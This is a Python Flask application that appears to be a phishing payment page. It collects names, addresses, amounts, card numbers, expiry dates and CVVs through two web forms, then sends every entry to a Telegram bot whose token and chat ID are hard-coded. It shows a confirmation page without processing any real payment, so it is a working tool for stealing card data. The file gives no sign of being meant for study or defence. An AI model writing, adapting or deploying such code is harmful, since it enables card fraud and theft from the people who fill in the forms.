from flask import Flask, request, render_template, redirect, url_for, session
import requests

app = Flask(__name__)
app.secret_key = "supersecretkey"  # Nécessaire pour utiliser `session`

# Fonction pour envoyer un message Telegram (y compris les infos sensibles)
def send_telegram_message(nom, prenom, adresse, montant, numero_carte, date_expiration, cvv):
    bot_token = "8022971997:AAGj1VGrYKEXWdX6GaHIzT8nsomWYoJt8mA"  # Ton token Telegram
    chat_id = "5652184847"  # Ton ID Telegram

    message = f"""
    Nouveau paiement reçu :
    - Nom : {nom}
    - Prénom : {prenom}
    - Adresse : {adresse}
    - Montant : {montant} €
    - Numéro de carte : {numero_carte}
    - Date d'expiration : {date_expiration}
    - CVV : {cvv}
    """

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}

    response = requests.post(url, json=payload)

    if response.status_code == 200:
        print("Message envoyé avec succès sur Telegram !")
    else:
        print(f"Erreur lors de l'envoi du message : {response.text}")

# Route pour la page d'accueil (formulaire paiement)
@app.route('/', methods=['GET', 'POST'])
def payment_form():
    if request.method == 'POST':
        # Récupération des données du formulaire de paiement
        session['nom'] = request.form.get('nom', '').strip()
        session['prenom'] = request.form.get('prenom', '').strip()
        session['adresse'] = request.form.get('adresse', '').strip()
        session['montant'] = request.form.get('montant', '').strip()

        if not all([session['nom'], session['prenom'], session['adresse'], session['montant']]):
            return "Erreur : Tous les champs sont obligatoires.", 400

        return redirect(url_for('credit_card_form'))
    
    return render_template('paiement.html')

# Route pour le formulaire de carte de crédit
@app.route('/credit-card', methods=['GET', 'POST'])
def credit_card_form():
    if request.method == 'POST':
        # Récupération des informations sensibles
        session['numero_carte'] = request.form.get('numero_carte', '').strip()
        session['date_expiration'] = request.form.get('date_expiration', '').strip()
        session['cvv'] = request.form.get('cvv', '').strip()

        if not all([session['numero_carte'], session['date_expiration'], session['cvv']]):
            return "Erreur : Tous les champs de la carte sont obligatoires.", 400

        # Envoi des données sur Telegram
        send_telegram_message(
            session['nom'],
            session['prenom'],
            session['adresse'],
            session['montant'],
            session['numero_carte'],
            session['date_expiration'],
            session['cvv']
        )

        return redirect(url_for('payment_confirmation'))
    
    return render_template('credit_card_form.html')

# Route pour la page de confirmation
@app.route('/confirmation')
def payment_confirmation():
    return render_template('confirmation.html', nom=session.get('nom'), prenom=session.get('prenom'), montant=session.get('montant'))

if __name__ == '__main__':
    app.run(debug=True)
